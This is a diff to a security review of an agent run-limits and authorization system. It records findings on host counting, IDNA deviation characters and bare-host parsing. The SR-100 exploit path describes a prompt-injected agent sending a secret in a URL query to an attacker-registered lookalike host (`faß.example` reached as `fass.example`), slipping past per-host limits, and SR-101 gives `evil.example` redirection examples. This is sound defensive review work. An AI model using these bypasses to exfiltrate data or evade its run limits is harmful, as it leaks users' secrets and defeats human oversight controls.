@@ -6,7 +6,7 @@
 
 ## Scope and method
 
-What merged after pass 9, `git log 95a7c0f..77cc0a4` (#193 to #199), plus the pending branch `fix/derive-host-bare` (read as `origin/fix/derive-host-bare-main`, not edited). In order of how much was read:
+What merged after pass 9, `git log 95a7c0f..77cc0a4` (#193 to #199), plus the then pending branch `fix/derive-host-bare` (read as `origin/fix/derive-host-bare-main` at `2e8d59d`, not edited). It merged as #201 (`277b8a0`) while this pass ran, with `limits.rs` byte for byte as reviewed, so what is said of the branch below holds for main from `277b8a0`. In order of how much was read:
 
 - the SR-91 fix (#193): `authz/pipeline.rs` `arg_probes` and `arg_taint` (`MAX_ARG_PROBES`, the fail-closed path, the owners expansion), `labels.rs`, both lease stores' `find_spans` with `MAX_SEQS_PER_PROBE`;
 - the SR-92 and SR-93 fixes (#195): `create_approval` in both stores (`pending_of_run` inside the `IMMEDIATE` transaction, the memory store under its lock), `rules::below_pending_cap` and `counts_as_pending`, `AuditError::TooManyPendingApprovals` and its 429 mapping in `error.rs`, the pipeline's handling in `request_approval`, `notify.rs` `Backlog`, `next_backlog`, `backlog_at_start`, `recover`, `sink.rs` `Settle::refill` and the delivery loop, `outbox_open_between` and `outbox_last_open_id`;
@@ -35,7 +35,7 @@ Every fix here has a regression test. SR-98's fails on `77cc0a4`; SR-99 corrects
 | SR-98 | Info | server (`sink.rs` delivery loop, `Settle::refill`) | A backlog batch filled the whole notice queue, so new notices pushed backlog rows out without one attempt, and `/readyz` read full while it drained | Fixed, test `notices_queued_while_a_backlog_batch_drains_drop_none_of_it_sr98` |
 | SR-99 | Info | server (`authz/pipeline.rs` `arg_probes`), docs | The doc said arguments past `MAX_ARG_PROBES` are "only checked for having a fingerprint"; they are fingerprinted in full | Fixed (docs), test `arguments_past_the_bound_are_named_only_when_they_have_a_fingerprint_sr99` |
 | SR-100 | Info | core (`limits.rs` `Derive::Host`) | IDNA deviation characters (`ß`, `ς`): the counted host is the non-transitional one, Python's stdlib connects to the transitional one | Proposed |
-| SR-101 | Info | core, branch `fix/derive-host-bare` | A bare value is counted as the host a client that adds `http://` reaches; a tool that resolves it against a current page reaches that page's host | Proposed (a doc sentence on the branch) |
+| SR-101 | Info | core (`limits.rs` `parse_url_or_bare_host`, #201) | A bare value is counted as the host a client that adds `http://` reaches; a tool that resolves it against a current page reaches that page's host | Proposed (a doc sentence) |
 
 ## Findings
 
@@ -64,20 +64,20 @@ Every fix here has a regression test. SR-98's fails on `77cc0a4`; SR-99 corrects
 
 ### SR-100: IDNA deviation characters count a host that Python's stdlib does not reach (Info, proposed)
 
-- **Component.** `attenuo-core` `limits.rs` `Derive::Host::apply`; on main for full URLs, and on `fix/derive-host-bare` for bare hosts too.
+- **Component.** `attenuo-core` `limits.rs` `Derive::Host::apply`; for full URLs, and since #201 for bare hosts too.
 - **Observation.** The `url` crate maps a host by UTS 46 non-transitional processing, as WHATWG does: `faß.example` is `xn--fa-hia.example` and `βόλος.example` is `xn--nxasmm1c.example`. Python's stdlib encodes a `str` host with its IDNA 2003 codec, which maps the four deviation characters (`ß` to `ss`, `ς` to `σ`, ZWJ and ZWNJ to nothing): `http.client`, `urllib.request` and `socket.getaddrinfo` connect to `fass.example` and `xn--nxasmq6b.example`. `requests`, `httpx`, Node and curl 8.5 with libidn2 agree with the crate (checked: `requests` prepares `http://xn--fa-hia.example/`, `httpx` `xn--fa-hia.example`). ZWJ and ZWNJ outside their joining context are refused by the crate (`CheckJoiners`), so `ß` and `ς` are what remains.
 - **Exploit path.** Narrow. With an upstream built on `urllib.request`: the run has reached `https://xn--fa-hia.example/` (the punycode spelling), so host `xn--fa-hia.example` is counted and seen. The injected agent then sends `https://faß.example/?d=<secret>`: counted as `xn--fa-hia.example`, seen, no new host under `distinct` or `ask_on_a_new_site`; the tool connects to `fass.example`, which the attacker registered. Both names are registrable under TLDs that allow `ß` (`.de` since 2010). The other direction (Unicode spelling first) only over-counts.
-- **Proposed patch.** As SR-56 did for backslashes, refuse to derive a host from a value whose host part holds `ß` (U+00DF) or `ς` (U+03C2), or ZWJ or ZWNJ (U+200D, U+200C); a host limit then answers `limit_arg_invalid` and run usage counts the value as itself. A refusal of inputs accepted today, so a behaviour change for the lead. Test: `https://faß.example/`, `faß.example` (on the branch), `https://βόλος.example/` have no derived host; `https://xn--fa-hia.example/` keeps its host.
+- **Proposed patch.** As SR-56 did for backslashes, refuse to derive a host from a value whose host part holds `ß` (U+00DF) or `ς` (U+03C2), or ZWJ or ZWNJ (U+200D, U+200C); a host limit then answers `limit_arg_invalid` and run usage counts the value as itself. A refusal of inputs accepted today, so a behaviour change for the lead. Test: `https://faß.example/`, `faß.example`, `https://βόλος.example/` have no derived host; `https://xn--fa-hia.example/` keeps its host.
 
-### SR-101: a bare value is counted as the host an `http://`-adding client reaches (Info, proposed for `fix/derive-host-bare`)
+### SR-101: a bare value is counted as the host an `http://`-adding client reaches (Info, proposed)
 
-- **Component.** `attenuo-core` `limits.rs` `parse_url_or_bare_host`, on `fix/derive-host-bare` only.
+- **Component.** `attenuo-core` `limits.rs` `parse_url_or_bare_host`, from `fix/derive-host-bare` (#201).
 - **Observation.** Before the branch, a value with no scheme had no host, so a host limit refused it (`limit_arg_invalid`, fail closed). The branch counts it as `http://` plus the value. That is the host reached by an upstream that adds a scheme to a value without one, as curl does, as many fetch tools do (pass 5, SR-63) and as the AgentDojo tools need. An upstream that instead resolves the value as a relative reference against a base, a crawler's or a browser tool's current page (`urljoin`, `new URL(value, page)`, Scrapy's `response.follow`), reaches the base's host: `good.example/?d=x` on `evil.example`'s page goes to `evil.example/good.example/?d=x` and counts `good.example`. The branch already refuses `/…` and `//…`, the two relative forms that could name another host, so the host reached is always the base, which the run reached and counted before. What the value can do is spend another host's count instead of the base's: a `calls_per` limit on the base host is passed by choosing a different first label each time (each new label is a new host under `distinct`, which still bounds it).
 - **Proposed patch.** No code change: one sentence in `Derive::Host`'s doc comment and in `docs/design/run-limits.md`: "A bare value counts the host a client reaches when it adds `http://` to it. For a tool that resolves its argument against a current page, give the argument as a full URL in the catalog's examples, or pair `calls_per` with `distinct`, since a bare value there reaches the page's host whatever it names."
 
-## The `fix/derive-host-bare` branch: safe to merge as is
+## The `fix/derive-host-bare` branch (#201): safe to merge as is
 
-Read at `origin/fix/derive-host-bare-main` (`2e8d59d`). Verdict: safe to merge as it stands, from a security point of view. It adds no way to make a host limit count a host other than the one a client reaches when it is given the value, beyond SR-100, which main already has for full URLs, and SR-101, a documented assumption. SR-101's sentence can go in with it or after it.
+Read at `origin/fix/derive-host-bare-main` (`2e8d59d`). Verdict: safe to merge as it stands, from a security point of view. It adds no way to make a host limit count a host other than the one a client reaches when it is given the value, beyond SR-100, which main already has for full URLs, and SR-101, a documented assumption. It has since merged as #201, and SR-101's sentence can follow it.
 
 The ways a parser could split the host differently all fall on the safe side:
 
